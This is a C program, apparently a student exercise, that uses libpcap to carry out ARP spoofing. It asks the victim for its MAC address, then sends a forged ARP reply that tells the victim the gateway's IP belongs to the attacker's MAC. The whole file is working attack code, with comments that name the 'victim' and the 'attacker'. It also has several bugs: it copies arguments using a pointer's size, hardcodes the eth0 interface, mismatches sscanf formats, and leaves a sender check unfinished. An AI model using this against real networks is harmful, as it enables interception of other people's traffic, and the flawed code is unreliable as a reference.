#include <stdio.h>              // for popen
#include <stdlib.h>
#include <pcap/pcap.h>          // for packet capture
#include <net/if.h>             // to get attacker's mac addr
#include <net/ethernet.h>       // for ethernet
#include <netinet/if_ether.h>   // for ether arp
#include <string.h>             // for memset
#include <arpa/inet.h>          //  

int main(int argc, char *argv[])
{
    int i = 0;
    /* input values */
    u_char interface[20];      // eth 0
    u_char senderip[20];       // victim's ip
    u_char targetip[20];       // router's ip
    u_char gwip[20];        // gateway's ip
    u_char mymac[20];       // attacker's mac
    u_char myip[20];        // my mac
    u_char sendermac[20];   // victim's mac

    const u_char *data;             // take packet
    struct pcap_pkthdr *pkHdr;      // captured packet

    char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    struct ether_header *ethHdr =  (struct ether_header *)packet;
    struct ether_arp *arpHdr = (struct ether_arp *)(packet + sizeof(struct ether_header));

    /* input error */
    if(argc != 4)
    {
        printf("Format: <inteface> <sender ip> <target ip>");
        exit(1);
    }

    /* get values */
    memcpy(interface, argv[1], sizeof(argv[1]));
    memcpy(senderip, argv[2], sizeof(argv[2]));
    memcpy(targetip ,argv[3], sizeof(argv[3]));

    /* Get my mac */
    FILE *fp;
    fp = popen("/bin/bash -c \"ifconfig eth0 \" | grep ether | awk \'{print $2}\'", "r");
    if (fp == NULL) {
        printf("Cannot find your MAC address !!!\n");
        exit (1);
    }

    while(fgets(mymac, sizeof(mymac), fp) != NULL);

    /* Get Router ip */
    fp = popen("ip route show | grep -i \'default via\'| awk \'{print $3 }\'", "r");
    if (fp == NULL) {
        printf("Cannot find GW's IP address !!!\n");
        exit (1);
    }

    while(fgets(gwip, sizeof(gwip), fp) != NULL);

    /* values setting */
    memset(ethHdr->ether_dhost, 0xFF, 6);               // Broadcasting
    memcpy(ethHdr->ether_shost, arpHdr->arp_sha, 6);    // Attacker's mac
    ethHdr->ether_type = htons(ETHERTYPE_ARP);          // set ARP

    sscanf(mymac, "%02x:%02x:%02x:%02x:%02x:%02x",      // my mac
           (u_char *) &arpHdr->arp_sha[0],
            (u_char *) &arpHdr->arp_sha[1],
            (u_char *) &arpHdr->arp_sha[2],
            (u_char *) &arpHdr->arp_sha[3],
            (u_char *) &arpHdr->arp_sha[4],
            (u_char *) &arpHdr->arp_sha[5]);

    sscanf(senderip, "%d.%d.%d.%d",                     // my ip
           (u_char *) &arpHdr->arp_spa[0],
            (u_char *) &arpHdr->arp_spa[1],
            (u_char *) &arpHdr->arp_spa[2],
            (u_char *) &arpHdr->arp_spa[3]);

    sscanf(targetip, "%d.%d.%d.%d",                     // Target IP = router ip = victim?
           (u_char *) &arpHdr->arp_tpa[0],
            (u_char *) &arpHdr->arp_tpa[1],
            (u_char *) &arpHdr->arp_tpa[2],
            (u_char *) &arpHdr->arp_tpa[3]);

    memset(arpHdr->arp_tha, 0x00, 6);                   // Router MAC

    // ARP Header
    arpHdr->arp_hrd = htons(ARPHRD_ETHER);              // Ethernet 10/100Mbps
    arpHdr->arp_pro = htons(ETHERTYPE_IP);              // Format of ip address.
    arpHdr->arp_hln = sizeof(arpHdr->arp_sha);          // Length of mac address.
    arpHdr->arp_pln = sizeof(arpHdr->arp_spa);          // Length of protocol address.
    arpHdr->arp_op = htons(ARPOP_REQUEST);              //ARP operation : Request
    
    /* send ARP request */
    pcap_t *handle;         // open handle
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(interface, 65535, 0, 1000, errbuf); // promiscuous mode = 1

    if (handle == NULL) {   // handle error
        fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
        exit(1);
    }
    if (pcap_sendpacket(handle,(const u_char *)packet, sizeof(packet)) == -1){
        printf("ARP Request Error: %s\n", pcap_geterr(handle));
        exit(1);
    } else {
        printf("\n");
        printf("\"Successfully sent ARP REQUEST :D\"\n\n");
        printf("+------------------------------+\n");
        printf("| sender's ip: %s |\n", senderip);
        printf("| target's ip: %s |\n", targetip);
        printf("+------------------------------+\n");
    }

    /* Take victim's MAC address */
    while(1) {
        int res = pcap_next_ex(handle, &pkHdr, &data);
        if (res == 0)
        {
            printf("Time out ... ...\n");
            continue;
        } else if (res < 0) {
            printf("Can't get packet: %s\n", pcap_geterr(handle));
            exit(1);
        } else { // res == 1
            printf("Getting Packet... ");
        }
        ethHdr = (struct ether_header *)data;

        if(ntohs(ethHdr->ether_type) == ETHERTYPE_ARP) {
            arpHdr = (struct ether_arp *)(data + sizeof(struct ether_header));
        } else
            continue;

        if(ntohs(arpHdr->arp_op) != ARPOP_REPLY)
            continue;

        // if( ??? == senderip) { How to check sender's ip??
        sprintf((u_char *) sendermac, "%02x:%02x:%02x:%02x:%02x:%02x",
                arpHdr->arp_sha[0],
                arpHdr->arp_sha[1],
                arpHdr->arp_sha[2],
                arpHdr->arp_sha[3],
                arpHdr->arp_sha[4],
                arpHdr->arp_sha[5]);
        break;
        // }
    }

    printf("\n\"Successfully Got Victim's MAC!!\"\n\t--> %s\n", sendermac);

    ethHdr = (struct ether_header *)packet;
    arpHdr = (struct ether_arp *)(packet + sizeof(struct ether_header));

    /* values setting */
    sscanf(mymac, "%02x:%02x:%02x:%02x:%02x:%02x",          // My mac
           (u_char *) &arpHdr->arp_sha[0],
            (u_char *) &arpHdr->arp_sha[1],
            (u_char *) &arpHdr->arp_sha[2],
            (u_char *) &arpHdr->arp_sha[3],
            (u_char *) &arpHdr->arp_sha[4],
            (u_char *) &arpHdr->arp_sha[5]);

    sscanf(gwip, "%d.%d.%d.%d",                             // gateway ip
           (u_char *) &arpHdr->arp_spa[0],
            (u_char *) &arpHdr->arp_spa[1],
            (u_char *) &arpHdr->arp_spa[2],
            (u_char *) &arpHdr->arp_spa[3]);

    sscanf(sendermac, "%02x:%02x:%02x:%02x:%02x:%02x",     // victim's MAC
           (u_char *) &arpHdr->arp_tha[0],
            (u_char *) &arpHdr->arp_tha[1],
            (u_char *) &arpHdr->arp_tha[2],
            (u_char *) &arpHdr->arp_tha[3],
            (u_char *) &arpHdr->arp_tha[4],
            (u_char *) &arpHdr->arp_tha[5]);

    sscanf(targetip, "%d.%d.%d.%d",                        // victim IP
           (u_char *) &arpHdr->arp_tpa[0],
            (u_char *) &arpHdr->arp_tpa[1],
            (u_char *) &arpHdr->arp_tpa[2],
            (u_char *) &arpHdr->arp_tpa[3]);
    printf("targetip: %s\n", targetip);

    memcpy(ethHdr->ether_dhost, arpHdr->arp_tha, sizeof(arpHdr->arp_tha));      // victim's mac
    memcpy(ethHdr->ether_shost, arpHdr->arp_sha, sizeof(arpHdr->arp_sha));      // Attacker's mac
    ethHdr->ether_type = htons(ETHERTYPE_ARP);
    arpHdr->arp_hrd = htons(ARPHRD_ETHER);
    arpHdr->arp_pro = htons(ETHERTYPE_IP);
    arpHdr->arp_hln = sizeof(arpHdr->arp_sha);
    arpHdr->arp_pln = sizeof(arpHdr->arp_spa);
    arpHdr->arp_op = htons(ARPOP_REPLY);            //ARP operation : Reply

    /* send ARP reply */
    if (pcap_sendpacket(handle,(const u_char *)packet, sizeof(packet)) == -1){
        printf("ARP Reply Error: %s\n", pcap_geterr(handle));
        exit(1);
    } else {
        printf("+--------------------------------+\n");
        printf("|\"Successfully sent ARP REPLY xD\"|\n");
        printf("+--------------------------------+\n");
    }
    pcap_close(handle);

    return 0;
}
